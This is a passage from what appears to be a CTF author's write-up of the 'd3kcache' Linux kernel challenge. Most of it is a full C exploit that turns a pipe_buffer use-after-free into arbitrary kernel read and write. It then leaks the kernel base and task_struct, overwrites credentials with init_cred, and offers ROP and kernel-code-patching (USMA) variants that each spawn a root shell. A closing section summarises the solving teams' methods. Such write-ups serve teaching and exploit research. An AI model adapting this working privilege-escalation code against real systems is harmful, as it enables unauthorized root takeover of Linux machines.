        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, snd_pipe_sz) < 0) {
            printf("[x] failed to resize %d pipe!\n", i);
            err_exit("FAILED to re-alloc pipe_buffer!");
        }
    }

    /* read victim page to check whether we've successfully hit it */
    read(pipe_fd[victim_pid][0], buf, SND_PIPE_BUF_SZ - 8 - sizeof(int));
    read(pipe_fd[victim_pid][0], &info_pipe_buf, sizeof(info_pipe_buf));

    printf("\033[34m\033[1m[?] info_pipe_buf->page: \033[0m%p\n" 
           "\033[34m\033[1m[?] info_pipe_buf->ops: \033[0m%p\n", 
           info_pipe_buf.page, info_pipe_buf.ops);

    if ((size_t) info_pipe_buf.page < 0xffff000000000000
        || (size_t) info_pipe_buf.ops < 0xffffffff81000000) {
        err_exit("FAILED to re-hit victim page!");
    }

    puts("\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m");
    printf("\033[32m\033[1m[+] Got page leak:\033[0m %p\n", info_pipe_buf.page);
    puts("");

    /* construct a second-level page uaf */
    puts("[*] construct a second-level uaf pipe page...");
    info_pipe_buf.page = (struct page*) ((size_t) info_pipe_buf.page + 0x40);
    write(pipe_fd[victim_pid][1], &info_pipe_buf, sizeof(info_pipe_buf));

    for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
        int nr;

        if (i == orig_pid || i == victim_pid) {
            continue;
        }

        read(pipe_fd[i][0], &nr, sizeof(nr));
        if (nr < PIPE_SPRAY_NUM && i != nr) {
            snd_orig_pid = nr;
            snd_vicitm_pid = i;
            printf("\033[32m\033[1m[+] Found second-level victim: \033[0m%d "
                   "\033[32m\033[1m, orig: \033[0m%d\n", 
                   snd_vicitm_pid, snd_orig_pid);
            break;
        }
    }

    if (snd_vicitm_pid == -1) {
        err_exit("FAILED to corrupt second-level pipe_buffer!");
    }
}

/**
 * VI - SECONDARY exploit stage: build pipe for arbitrary read & write
*/

void building_self_writing_pipe(void)
{
    size_t buf[0x1000];
    size_t trd_pipe_sz = 0x1000 * (TRD_PIPE_BUF_SZ/sizeof(struct pipe_buffer));
    struct pipe_buffer evil_pipe_buf;
    struct page *page_ptr;

    memset(buf, 0, sizeof(buf));

    /* let the page's ptr at pipe_buffer */
    write(pipe_fd[snd_vicitm_pid][1], buf, TRD_PIPE_BUF_SZ - 24 -3*sizeof(int));

    /* free orignal pipe's page */
    puts("[*] free second-level original pipe...");
    close(pipe_fd[snd_orig_pid][0]);
    close(pipe_fd[snd_orig_pid][1]);

    /* try to rehit victim page by reallocating pipe_buffer */
    puts("[*] fcntl() to set the pipe_buffer on second-level victim page...");
    for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
        if (i == orig_pid || i == victim_pid 
            || i == snd_orig_pid || i == snd_vicitm_pid) {
            continue;
        }

        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, trd_pipe_sz) < 0) {
            printf("[x] failed to resize %d pipe!\n", i);
            err_exit("FAILED to re-alloc pipe_buffer!");
        }
    }

    /* let a pipe->bufs pointing to itself */
    puts("[*] hijacking the 2nd pipe_buffer on page to itself...");
    evil_pipe_buf.page = info_pipe_buf.page;
    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;
    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;
    evil_pipe_buf.ops = info_pipe_buf.ops;
    evil_pipe_buf.flags = info_pipe_buf.flags;
    evil_pipe_buf.private = info_pipe_buf.private;

    write(pipe_fd[snd_vicitm_pid][1], &evil_pipe_buf, sizeof(evil_pipe_buf));

    /* check for third-level victim pipe */
    for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
        if (i == orig_pid || i == victim_pid 
            || i == snd_orig_pid || i == snd_vicitm_pid) {
            continue;
        }

        read(pipe_fd[i][0], &page_ptr, sizeof(page_ptr));
        if (page_ptr == evil_pipe_buf.page) {
            self_2nd_pipe_pid = i;
            printf("\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n", 
                    self_2nd_pipe_pid);
            break;
        }
    }

    if (self_2nd_pipe_pid == -1) {
        err_exit("FAILED to build a self-writing pipe!");
    }

    /* overwrite the 3rd pipe_buffer to this page too */
    puts("[*] hijacking the 3rd pipe_buffer on page to itself...");
    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;
    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;

    write(pipe_fd[snd_vicitm_pid][1],buf,TRD_PIPE_BUF_SZ-sizeof(evil_pipe_buf));
    write(pipe_fd[snd_vicitm_pid][1], &evil_pipe_buf, sizeof(evil_pipe_buf));

    /* check for third-level victim pipe */
    for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
        if (i == orig_pid || i == victim_pid 
            || i == snd_orig_pid || i == snd_vicitm_pid
            || i == self_2nd_pipe_pid) {
            continue;
        }

        read(pipe_fd[i][0], &page_ptr, sizeof(page_ptr));
        if (page_ptr == evil_pipe_buf.page) {
            self_3rd_pipe_pid = i;
            printf("\033[32m\033[1m[+] Found another self-writing pipe:\033[0m"
                    "%d\n", self_3rd_pipe_pid);
            break;
        }
    }

    if (self_3rd_pipe_pid == -1) {
        err_exit("FAILED to build a self-writing pipe!");
    }

    /* overwrite the 4th pipe_buffer to this page too */
    puts("[*] hijacking the 4th pipe_buffer on page to itself...");
    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;
    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;

    write(pipe_fd[snd_vicitm_pid][1],buf,TRD_PIPE_BUF_SZ-sizeof(evil_pipe_buf));
    write(pipe_fd[snd_vicitm_pid][1], &evil_pipe_buf, sizeof(evil_pipe_buf));

    /* check for third-level victim pipe */
    for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
        if (i == orig_pid || i == victim_pid 
            || i == snd_orig_pid || i == snd_vicitm_pid
            || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid) {
            continue;
        }

        read(pipe_fd[i][0], &page_ptr, sizeof(page_ptr));
        if (page_ptr == evil_pipe_buf.page) {
            self_4th_pipe_pid = i;
            printf("\033[32m\033[1m[+] Found another self-writing pipe:\033[0m"
                    "%d\n", self_4th_pipe_pid);
            break;
        }
    }

    if (self_4th_pipe_pid == -1) {
        err_exit("FAILED to build a self-writing pipe!");
    }

    puts("");
}

struct pipe_buffer evil_2nd_buf, evil_3rd_buf, evil_4th_buf;
char temp_zero_buf[0x1000]= { '\0' };

/**
 * @brief Setting up 3 pipes for arbitrary read & write.
 * We need to build a circle there for continuously memory seeking:
 * - 2nd pipe to search
 * - 3rd pipe to change 4th pipe
 * - 4th pipe to change 2nd and 3rd pipe
 */
void setup_evil_pipe(void)
{
    /* init the initial val for 2nd,3rd and 4th pipe, for recovering only */
    memcpy(&evil_2nd_buf, &info_pipe_buf, sizeof(evil_2nd_buf));
    memcpy(&evil_3rd_buf, &info_pipe_buf, sizeof(evil_3rd_buf));
    memcpy(&evil_4th_buf, &info_pipe_buf, sizeof(evil_4th_buf));

    evil_2nd_buf.offset = 0;
    evil_2nd_buf.len = 0xff0;

    /* hijack the 3rd pipe pointing to 4th */
    evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * 3;
    evil_3rd_buf.len = 0;
    write(pipe_fd[self_4th_pipe_pid][1], &evil_3rd_buf, sizeof(evil_3rd_buf));

    evil_4th_buf.offset = TRD_PIPE_BUF_SZ;
    evil_4th_buf.len = 0;
}

void arbitrary_read_by_pipe(struct page *page_to_read, void *dst)
{
    /* page to read */
    evil_2nd_buf.offset = 0;
    evil_2nd_buf.len = 0x1ff8;
    evil_2nd_buf.page = page_to_read;

    /* hijack the 4th pipe pointing to 2nd pipe */
    write(pipe_fd[self_3rd_pipe_pid][1], &evil_4th_buf, sizeof(evil_4th_buf));

    /* hijack the 2nd pipe for arbitrary read */
    write(pipe_fd[self_4th_pipe_pid][1], &evil_2nd_buf, sizeof(evil_2nd_buf));
    write(pipe_fd[self_4th_pipe_pid][1], 
          temp_zero_buf, 
          TRD_PIPE_BUF_SZ-sizeof(evil_2nd_buf));
    
    /* hijack the 3rd pipe to point to 4th pipe */
    write(pipe_fd[self_4th_pipe_pid][1], &evil_3rd_buf, sizeof(evil_3rd_buf));

    /* read out data */
    read(pipe_fd[self_2nd_pipe_pid][0], dst, 0xfff);
}

void arbitrary_write_by_pipe(struct page *page_to_write, void *src, size_t len)
{
    /* page to write */
    evil_2nd_buf.page = page_to_write;
    evil_2nd_buf.offset = 0;
    evil_2nd_buf.len = 0;

    /* hijack the 4th pipe pointing to 2nd pipe */
    write(pipe_fd[self_3rd_pipe_pid][1], &evil_4th_buf, sizeof(evil_4th_buf));

    /* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */
    write(pipe_fd[self_4th_pipe_pid][1], &evil_2nd_buf, sizeof(evil_2nd_buf));
    write(pipe_fd[self_4th_pipe_pid][1], 
          temp_zero_buf, 
          TRD_PIPE_BUF_SZ - sizeof(evil_2nd_buf));
    
    /* hijack the 3rd pipe to point to 4th pipe */
    write(pipe_fd[self_4th_pipe_pid][1], &evil_3rd_buf, sizeof(evil_3rd_buf));

    /* write data into dst page */
    write(pipe_fd[self_2nd_pipe_pid][1], src, len);
}

/**
 * VII - FINAL exploit stage with arbitrary read & write
*/

size_t *tsk_buf, current_task_page, current_task, parent_task, buf[0x1000];


void info_leaking_by_arbitrary_pipe()
{
    size_t *comm_addr;

    memset(buf, 0, sizeof(buf));

    puts("[*] Setting up kernel arbitrary read & write...");
    setup_evil_pipe();

    /**
     * KASLR's granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,
     * so we can simply get the vmemmap_base like this in a SMALL-MEM env.
     * For MEM > 1GB, we can just find the secondary_startup_64 func ptr,
     * which is located on physmem_base + 0x9d000, i.e., vmemmap_base[156] page.
     * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.
     */
    vmemmap_base = (size_t) info_pipe_buf.page & 0xfffffffff0000000;
    for (;;) {
        arbitrary_read_by_pipe((struct page*) (vmemmap_base + 157 * 0x40), buf);

        if (buf[0] > 0xffffffff81000000 && ((buf[0] & 0xfff) == 0x070)) {
            kernel_base = buf[0] -  0x070;
            kernel_offset = kernel_base - 0xffffffff81000000;
            printf("\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n"
                   "\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n", 
                   kernel_base, kernel_offset);
            break;
        }

        vmemmap_base -= 0x10000000;
    }
    printf("\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n", vmemmap_base);

    /* now seeking for the task_struct in kernel memory */
    puts("[*] Seeking task_struct in memory...");

    prctl(PR_SET_NAME, "arttnba3pwnn");

    /**
     * For a machine with MEM less than 256M, we can simply get the:
     *      page_offset_base = heap_leak & 0xfffffffff0000000;
     * But that's not always accurate, espacially on a machine with MEM > 256M.
     * So we need to find another way to calculate the page_offset_base.
     * 
     * Luckily the task_struct::ptraced points to itself, so we can get the
     * page_offset_base by vmmemap and current task_struct as we know the page.
     * 
     * Note that the offset of different filed should be referred to your env.
     */
    for (int i = 0; 1; i++) {
        arbitrary_read_by_pipe((struct page*) (vmemmap_base + i * 0x40), buf);
    
        comm_addr = memmem(buf, 0xf00, "arttnba3pwnn", 12);
        if (comm_addr && (comm_addr[-2] > 0xffff888000000000) /* task->cred */
            && (comm_addr[-3] > 0xffff888000000000) /* task->real_cred */
            && (comm_addr[-57] > 0xffff888000000000) /* task->read_parent */
            && (comm_addr[-56] > 0xffff888000000000)) {  /* task->parent */

            /* task->read_parent */
            parent_task = comm_addr[-57];

            /* task_struct::ptraced */
            current_task = comm_addr[-50] - 2528;

            page_offset_base = (comm_addr[-50]&0xfffffffffffff000) - i * 0x1000;
            page_offset_base &= 0xfffffffff0000000;

            printf("\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n",
                   (struct page*) (vmemmap_base + i * 0x40));
            printf("\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n",
                   page_offset_base);
            printf("\033[34m\033[1m[*] current task_struct's addr: \033[0m"
                   "0x%lx\n\n", current_task);
            break;
        }
    }
}

/**
 * @brief find the init_task and copy something to current task_struct
*/
void privilege_escalation_by_task_overwrite(void)
{
    /* finding the init_task, the final parent of every task */
    puts("[*] Seeking for init_task...");

    for (;;) {
        size_t ptask_page_addr = direct_map_addr_to_page_addr(parent_task);

        tsk_buf = (size_t*) ((size_t) buf + (parent_task & 0xfff));

        arbitrary_read_by_pipe((struct page*) ptask_page_addr, buf);
        arbitrary_read_by_pipe((struct page*) (ptask_page_addr+0x40),&buf[512]);

        /* task_struct::real_parent */
        if (parent_task == tsk_buf[309]) {
            break;
        }

        parent_task = tsk_buf[309];
    }

    init_task = parent_task;
    init_cred = tsk_buf[363];
    init_nsproxy = tsk_buf[377];

    printf("\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n", init_task);
    printf("\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n", init_cred);
    printf("\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n",init_nsproxy);

    /* now, changing the current task_struct to get the full root :) */
    puts("[*] Escalating ROOT privilege now...");

    current_task_page = direct_map_addr_to_page_addr(current_task);

    arbitrary_read_by_pipe((struct page*) current_task_page, buf);
    arbitrary_read_by_pipe((struct page*) (current_task_page+0x40), &buf[512]);

    tsk_buf = (size_t*) ((size_t) buf + (current_task & 0xfff));
    tsk_buf[363] = init_cred;
    tsk_buf[364] = init_cred;
    tsk_buf[377] = init_nsproxy;

    arbitrary_write_by_pipe((struct page*) current_task_page, buf, 0xff0);
    arbitrary_write_by_pipe((struct page*) (current_task_page+0x40),
                            &buf[512], 0xff0);

    puts("[+] Done.\n");
    puts("[*] checking for root...");

    get_root_shell();
}

#define PTE_OFFSET 12
#define PMD_OFFSET 21
#define PUD_OFFSET 30
#define PGD_OFFSET 39

#define PT_ENTRY_MASK 0b111111111UL
#define PTE_MASK (PT_ENTRY_MASK << PTE_OFFSET)
#define PMD_MASK (PT_ENTRY_MASK << PMD_OFFSET)
#define PUD_MASK (PT_ENTRY_MASK << PUD_OFFSET)
#define PGD_MASK (PT_ENTRY_MASK << PGD_OFFSET)

#define PTE_ENTRY(addr) ((addr >> PTE_OFFSET) & PT_ENTRY_MASK)
#define PMD_ENTRY(addr) ((addr >> PMD_OFFSET) & PT_ENTRY_MASK)
#define PUD_ENTRY(addr) ((addr >> PUD_OFFSET) & PT_ENTRY_MASK)
#define PGD_ENTRY(addr) ((addr >> PGD_OFFSET) & PT_ENTRY_MASK)

#define PAGE_ATTR_RW (1UL << 1)
#define PAGE_ATTR_NX (1UL << 63)

size_t pgd_addr, mm_struct_addr, *mm_struct_buf;
size_t stack_addr, stack_addr_another;
size_t stack_page, mm_struct_page;

size_t vaddr_resolve(size_t pgd_addr, size_t vaddr)
{
    size_t buf[0x1000];
    size_t pud_addr, pmd_addr, pte_addr, pte_val;

    arbitrary_read_by_pipe((void*) direct_map_addr_to_page_addr(pgd_addr), buf);
    pud_addr = (buf[PGD_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);
    pud_addr += page_offset_base;

    arbitrary_read_by_pipe((void*) direct_map_addr_to_page_addr(pud_addr), buf);
    pmd_addr = (buf[PUD_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);
    pmd_addr += page_offset_base;

    arbitrary_read_by_pipe((void*) direct_map_addr_to_page_addr(pmd_addr), buf);
    pte_addr = (buf[PMD_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);
    pte_addr += page_offset_base;

    arbitrary_read_by_pipe((void*) direct_map_addr_to_page_addr(pte_addr), buf);
    pte_val = (buf[PTE_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);

    return pte_val;
}

size_t vaddr_resolve_for_3_level(size_t pgd_addr, size_t vaddr)
{
    size_t buf[0x1000];
    size_t pud_addr, pmd_addr;

    arbitrary_read_by_pipe((void*) direct_map_addr_to_page_addr(pgd_addr), buf);
    pud_addr = (buf[PGD_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);
    pud_addr += page_offset_base;

    arbitrary_read_by_pipe((void*) direct_map_addr_to_page_addr(pud_addr), buf);
    pmd_addr = (buf[PUD_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);
    pmd_addr += page_offset_base;

    arbitrary_read_by_pipe((void*) direct_map_addr_to_page_addr(pmd_addr), buf);
    return (buf[PMD_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);
}

void vaddr_remapping(size_t pgd_addr, size_t vaddr, size_t paddr)
{
    size_t buf[0x1000];
    size_t pud_addr, pmd_addr, pte_addr;

    arbitrary_read_by_pipe((void*) direct_map_addr_to_page_addr(pgd_addr), buf);
    pud_addr = (buf[PGD_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);
    pud_addr += page_offset_base;

    arbitrary_read_by_pipe((void*) direct_map_addr_to_page_addr(pud_addr), buf);
    pmd_addr = (buf[PUD_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);
    pmd_addr += page_offset_base;

    arbitrary_read_by_pipe((void*) direct_map_addr_to_page_addr(pmd_addr), buf);
    pte_addr = (buf[PMD_ENTRY(vaddr)] & (~0xfff)) & (~PAGE_ATTR_NX);
    pte_addr += page_offset_base;

    arbitrary_read_by_pipe((void*) direct_map_addr_to_page_addr(pte_addr), buf);
    buf[PTE_ENTRY(vaddr)] = paddr | 0x8000000000000867; /* mark it writable */
    arbitrary_write_by_pipe((void*) direct_map_addr_to_page_addr(pte_addr), buf,
                            0xff0);
}

void pgd_vaddr_resolve(void)
{
    puts("[*] Reading current task_struct...");

    /* read current task_struct */
    current_task_page = direct_map_addr_to_page_addr(current_task);
    arbitrary_read_by_pipe((struct page*) current_task_page, buf);
    arbitrary_read_by_pipe((struct page*) (current_task_page+0x40), &buf[512]);

    tsk_buf = (size_t*) ((size_t) buf + (current_task & 0xfff));
    stack_addr = tsk_buf[4];
    mm_struct_addr = tsk_buf[292];

    printf("\033[34m\033[1m[*] kernel stack's addr:\033[0m0x%lx\n",stack_addr);
    printf("\033[34m\033[1m[*] mm_struct's addr:\033[0m0x%lx\n",mm_struct_addr);

    mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);

    printf("\033[34m\033[1m[*] mm_struct's page:\033[0m0x%lx\n",mm_struct_page);

    /* read mm_struct */
    arbitrary_read_by_pipe((struct page*) mm_struct_page, buf);
    arbitrary_read_by_pipe((struct page*) (mm_struct_page+0x40), &buf[512]);

    mm_struct_buf = (size_t*) ((size_t) buf + (mm_struct_addr & 0xfff));

    /* only this is a virtual addr, others in page table are all physical addr*/
    pgd_addr = mm_struct_buf[9];

    printf("\033[32m\033[1m[+] Got kernel page table of current task:\033[0m"
           "0x%lx\n\n", pgd_addr);
}

/**
 * It may also be okay to write ROP chain on pipe_write's stack, if there's
 * no CONFIG_RANDOMIZE_KSTACK_OFFSET_DEFAULT(it can also be bypass by RETs). 
 * But what I want is a more novel and general exploitation that 
 * doesn't need any information about the kernel image. 
 * So just simply overwrite the task_struct is good :)
 * 
 * If you still want a normal ROP, refer to following codes.
*/

#define COMMIT_CREDS 0xffffffff811284e0
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff82201a90
#define INIT_CRED 0xffffffff83079ee8
#define POP_RDI_RET 0xffffffff810157a9
#define RET 0xffffffff810157aa

void privilege_escalation_by_rop(void)
{
    size_t rop[0x1000], idx = 0; 

    /* resolving some vaddr */
    pgd_vaddr_resolve();
    
    /* reading the page table directly to get physical addr of kernel stack*/
    puts("[*] Reading page table...");

    stack_addr_another = vaddr_resolve(pgd_addr, stack_addr);
    stack_addr_another &= (~PAGE_ATTR_NX); /* N/X bit */
    stack_addr_another += page_offset_base;

    printf("\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m"
           "0x%lx\n\n", stack_addr_another);

    /* construct the ROP */
    for (int i = 0; i < ((0x1000 - 0x100) / 8); i++) {
        rop[idx++] = RET + kernel_offset;
    }

    rop[idx++] = POP_RDI_RET + kernel_offset;
    rop[idx++] = INIT_CRED + kernel_offset;
    rop[idx++] = COMMIT_CREDS + kernel_offset;
    rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE +54 + kernel_offset;
    rop[idx++] = *(size_t*) "arttnba3";
    rop[idx++] = *(size_t*) "arttnba3";
    rop[idx++] = (size_t) get_root_shell;
    rop[idx++] = user_cs;
    rop[idx++] = user_rflags;
    rop[idx++] = user_sp;
    rop[idx++] = user_ss;

    stack_page = direct_map_addr_to_page_addr(stack_addr_another);

    puts("[*] Hijacking current task's stack...");

    sleep(5);

    arbitrary_write_by_pipe((struct page*) (stack_page + 0x40 * 3), rop, 0xff0);
}

void privilege_escalation_by_usma(void)
{
    #define NS_CAPABLE_SETID 0xffffffff810fd2a0

    char *kcode_map, *kcode_func;
    size_t dst_paddr, dst_vaddr, *rop, idx = 0;

    /* resolving some vaddr */
    pgd_vaddr_resolve();

    kcode_map = mmap((void*) 0x114514000, 0x2000, PROT_READ | PROT_WRITE, 
                     MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (!kcode_map) {
        err_exit("FAILED to create mmap area!");
    }

    /* because of lazy allocation, we need to write it manually */
    for (int i = 0; i < 8; i++) {
        kcode_map[i] = "arttnba3"[i];
        kcode_map[i + 0x1000] = "arttnba3"[i];
    }

    /* overwrite kernel code seg to exec shellcode directly :) */
    dst_vaddr = NS_CAPABLE_SETID + kernel_offset;
    printf("\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n",
           dst_vaddr);

    dst_paddr = vaddr_resolve_for_3_level(pgd_addr, dst_vaddr);
    dst_paddr += 0x1000 * PTE_ENTRY(dst_vaddr);

    printf("\033[32m\033[1m[+] Got ns_capable_setid's phys addr: \033[0m"
           "0x%lx\n\n", dst_paddr);

    /* remapping to our mmap area */
    vaddr_remapping(pgd_addr, 0x114514000, dst_paddr);
    vaddr_remapping(pgd_addr, 0x114514000 + 0x1000, dst_paddr + 0x1000);

    /* overwrite kernel code segment directly */

    puts("[*] Start overwriting kernel code segment...");

    /**
     * The setresuid() check for user's permission by ns_capable_setid(),
     * so we can just patch it to let it always return true :)
     */
    memset(kcode_map + (NS_CAPABLE_SETID & 0xfff), '\x90', 0x40); /* nop */
    memcpy(kcode_map + (NS_CAPABLE_SETID & 0xfff) + 0x40, 
            "\xf3\x0f\x1e\xfa"  /* endbr64 */
            "H\xc7\xc0\x01\x00\x00\x00"  /* mov rax, 1 */
            "\xc3", /* ret */
            12);

    /* get root now :) */
    puts("[*] trigger evil ns_capable_setid() in setresuid()...\n");

    sleep(5);

    setresuid(0, 0, 0);
    get_root_shell();
}

/**
 * Just for testing CFI's availability :)
*/
void trigger_control_flow_integrity_detection(void)
{
    size_t buf[0x1000];
    struct pipe_buffer *pbuf = (void*) ((size_t)buf + TRD_PIPE_BUF_SZ);
    struct pipe_buf_operations *ops, *ops_addr;

    ops_addr = (struct pipe_buf_operations*) 
                 (((size_t) info_pipe_buf.page - vmemmap_base) / 0x40 * 0x1000);
    ops_addr = (struct pipe_buf_operations*)((size_t)ops_addr+page_offset_base);

    /* two random gadget :) */
    ops = (struct pipe_buf_operations*) buf;
    ops->confirm = (void*)(0xffffffff81a78568 + kernel_offset);
    ops->release = (void*)(0xffffffff816196e6 + kernel_offset);

    for (int i = 0; i < 10; i++) {
        pbuf->ops = ops_addr;
        pbuf = (struct pipe_buffer *)((size_t) pbuf + TRD_PIPE_BUF_SZ);
    }

    evil_2nd_buf.page = info_pipe_buf.page;
    evil_2nd_buf.offset = 0;
    evil_2nd_buf.len = 0;

    /* hijack the 4th pipe pointing to 2nd pipe */
    write(pipe_fd[self_3rd_pipe_pid][1],&evil_4th_buf,sizeof(evil_4th_buf));

    /* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */
    write(pipe_fd[self_4th_pipe_pid][1],&evil_2nd_buf,sizeof(evil_2nd_buf));
    write(pipe_fd[self_4th_pipe_pid][1], 
          temp_zero_buf, 
          TRD_PIPE_BUF_SZ - sizeof(evil_2nd_buf));
        
    /* hijack the 3rd pipe to point to 4th pipe */
    write(pipe_fd[self_4th_pipe_pid][1],&evil_3rd_buf,sizeof(evil_3rd_buf));

    /* write data into dst page */
    write(pipe_fd[self_2nd_pipe_pid][1], buf, 0xf00); 

    /* trigger CFI... */
    puts("[=] triggering CFI's detection...\n");
    sleep(5);
    close(pipe_fd[self_2nd_pipe_pid][0]);
    close(pipe_fd[self_2nd_pipe_pid][1]);
}

int main(int argc, char **argv, char **envp)
{
    /**
     * Step.O - fundamental works
     */

    save_status();

    /* bind core to 0 */
    bind_core(0);

    /* dev file */
    dev_fd = open("/dev/d3kcache", O_RDWR);
    if (dev_fd < 0) {
        err_exit("FAILED to open /dev/d3kcache!");
    }

    /* spray pgv pages */
    prepare_pgv_system();
    prepare_pgv_pages();

    /**
     * Step.I - page-level heap fengshui to make a cross-cache off-by-null,
     * making two pipe_buffer pointing to the same pages
     */
    corrupting_first_level_pipe_for_page_uaf();

    /**
     * Step.II - re-allocate the victim page to pipe_buffer,
     * leak page-related address and construct a second-level pipe uaf
     */
    corrupting_second_level_pipe_for_pipe_uaf();

    /**
     * Step.III - re-allocate the second-level victim page to pipe_buffer,
     * construct three self-page-pointing pipe_buffer 
     */
    building_self_writing_pipe();

    /**
     * Step.IV - leaking fundamental information by pipe
     */
    info_leaking_by_arbitrary_pipe();

    /**
     * Step.V - different method of exploitation
     */

    if (argv[1] && !strcmp(argv[1], "rop")) {
        /* traditionally root by rop */
        privilege_escalation_by_rop();
    } else if (argv[1] && !strcmp(argv[1], "cfi")) {
        /* extra - check for CFI's availability */
        trigger_control_flow_integrity_detection();
    } else if (argv[1] && !strcmp(argv[1], "usma")) {
        privilege_escalation_by_usma();
    }else {
        /* default: root by seeking init_task and overwrite current */
        privilege_escalation_by_task_overwrite();
    }

    /* we SHOULDN'T get there, so panic :( */
    trigger_control_flow_integrity_detection();
    
    return 0;
}

```



# 0x03. Conclusion

My `d3kcache` challenge has only two solvers this time: NU1L and TeamGoulash. Both teams chose to overwrite the `busybox` to obtained the flag.

NU1L team sprayed the `msg_msg` and used this null-byte overflow to do a partial overwrite on the  `msg_msg->m_list.next` to construct a UAF (similar to [CVE-2021-22555](https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html)). Then they sprayed the `msg_msgseg` to construct a fake `msg_msg`, overwrite the `m_ts` to perform the out-of-bound read. Finally they used  `fcntl(F_SETPIPE_SZ)`  to resize the `pipe_buffer` to fit in the UAF object, using [pipe primitive](https://github.com/veritas501/pipe-primitive) to perform the dirty pipe attack. As the `msg_msg` in size `0x1000` also come from order-3, it's also possible for them to achieve the corss-cache overflow. But at the first stage they need to fit in a `pipe_buffer` with the size of `0xc0` (from `kmalloc-cg-192`), the total reliability is about 1/16.

TeamGoulash used the  `fcntl(F_SETPIPE_SZ)` to let the `pipe_buffer` fit in order-3 to do a page-level UAF. Then they `fork()` a new process out to try to re-allocate the UAF page as the part of its page table. As the page table is writable, they mapped the read-only `busybox` into the memory and make it writable to perform a write beyond privilege. However there're so many noisy objects that may get this UAF page, the total reliability is about 5%.

Generally speaking, I'm satisfied with my `d3kcache` challenge. Hope that I can bring you something more interesting in the future : )

![TeamGoulash：hidethepain](https://s2.loli.net/2023/05/01/SFKbgnzPJdIYUZT.png)


